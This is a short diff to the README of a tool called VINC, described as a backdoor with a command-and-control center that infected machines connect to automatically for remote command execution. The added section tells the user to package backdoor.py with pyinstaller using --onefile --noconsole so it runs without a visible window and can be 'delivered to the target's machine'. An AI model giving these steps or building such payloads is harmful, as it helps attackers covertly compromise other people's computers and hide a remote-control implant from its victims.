@@ -27,6 +27,15 @@ To run VINC's command and control center simply run:
 python commandCenter.py
 ```
 
+The backdoor can be converted into an executable file in order to be delivered to the target's machine:
+
+```
+pip install pyinstaller
+```
+```
+pyinstaller backdoor.py --onefile --noconsole
+```
+
 ## How it works :gear:
 
 All the machines running vinc will connect to the vinc server automatically and will be able to run commands remotely.
